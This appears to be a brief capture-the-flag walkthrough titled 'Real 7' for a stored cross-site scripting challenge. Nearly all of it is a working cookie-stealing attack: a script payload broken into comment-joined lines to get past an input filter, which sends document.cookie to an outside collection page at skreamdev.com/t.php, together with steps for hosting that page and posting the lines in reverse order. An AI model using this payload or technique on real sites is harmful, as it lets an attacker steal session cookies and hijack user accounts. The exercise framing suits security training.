# Real 7

Upload t.php to your server
```
http://skreamdev.com/t.php?c=*cookie*
```
Post to the form line by line from bottom to top

```html
<script>/*\
*/var i=new Image();/*\
*/i.src="http://skr"+/*\
*/"eamdev.com"+/*\
*/"/t.php?c"+/*\
*/"="+document.cookie;/*\
*/</script>
```
Wait for the vicim to visit the page and collect the flag
